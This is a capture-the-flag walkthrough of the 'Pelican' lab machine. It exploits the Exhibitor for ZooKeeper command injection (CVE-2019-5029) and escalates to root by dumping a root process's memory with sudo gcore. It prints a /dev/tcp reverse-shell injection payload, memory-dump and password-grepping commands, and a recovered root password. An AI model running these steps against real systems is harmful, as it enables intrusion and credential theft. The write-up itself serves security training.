
# Introduction

This lab demonstrates exploiting an unauthenticated command injection vulnerability in the Exhibitor UI for Apache Zookeeper to gain initial access. Attackers will escalate privileges by dumping the memory of a root process using the sudo-allowed gcore command to retrieve root credentials. 

# Objective

- Identify and exploit the Exhibitor UI command injection vulnerability to gain a low-privilege shell.
- Enumerate processes and privileges available to the compromised user.
- Use sudo access to gcore to dump memory of an active root process.
- Analyze the dumped memory to extract sensitive information, such as root credentials.
- Escalate privileges to root using the extracted credentials and validate full system access.

# Information Gathering 

Nmap Scans:

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.151.98:8080/exhibitor/v1/ui/index.html
34051/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-10-01T15:57:31-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-01T19:57:29
|_  start_date: N/A
|_clock-skew: mean: 1h19m39s, deviation: 2h18m35s, median: -21s

Open ports ==22,139,445,631,2181,222,8080,8081,34051

The target IP did not open directly, we can try adding the IPS address to the /etc/hosts file to gain an http site. 

	echo 192.168.151.98 kalitry | sudo tee -a /etc/hosts

I have only placed the current name as a place holder for the target IP.

Luckily, now that we have added the IP address to the /etc/hosts file, we can access a web page on the target IP port 8080.

On port 8080, we see an Exhibitor for Zookeeper web title and a version number, v1.0.

![](Pasted%20image%2020261001155600.png)


Using this title and version number we research for any known exploits for our service enumeration.
# Service Enumeration

After finding a known exploit of Exhibitor on Talos, we attempt the exploit on the web service. 

Talos Exhibitor Exploit & Proof of Concept (CVE-2019-5029) -> https://talosintelligence.com/vulnerability_reports/TALOS-2019-0790 


The exploit is performed by placing "$()" around the command of your choice which you want to run on the host server inside of the Exhibitor "java.env script" field

Ex. 
	$(/bin/bash -i >& /dev/tcp/192.168.XXX.XXX/80 0>&1)

In the above example, I chose to create a reverse shell on the port 80 as my injected command.

Successfully, we are able to get a foothold shell as the user, "Charles" when connected to our listener on port 80

	charles@pelican:/opt/zookeeper$

The local.txt file can be found in the /home directory for our first flag.
# Privilege Escalation

Now that we have a foothold, we are going to run through common areas to find an opening for our privilege escalation. 

Starting with searching for files with the SUID bit set, we search using:

	find / -type f -perm -4000 2>/dev/null

In addition, we check to see if we are able to run the *sudo* command with the Charles account:

	sudo -l

As Charles we are able to run the *gcore* command, this will be our opening for escalation.

After some open research on GTFOBins and Google, we find that gcore can dump information from memory of running processes. To check on the available running processes, we run the belwo command  for any processes running as root:

	ps -ef | grep root

In the list of file output, one file stands out more than others, "/usr/bin/pssword-store."

Using the *sudo gcore* command we can output the information in memory to a file:

	sudo gcore -o exploit 494

Now, we use the *strings* command to parse the file for any readable information stored and specifically search for anything related to passwords or secrets:

	strings output.494 | grep -IE 'password|passwd|secret'


With success, we find some information that reads, "001: Password: root: ClogKingpingInning731"

We can try this login by switching to the root user on the current working machine:

	su root

Success, we have achieved a root shell and the machine is solved! The root flag can be found in the home directory in the proof.txt file.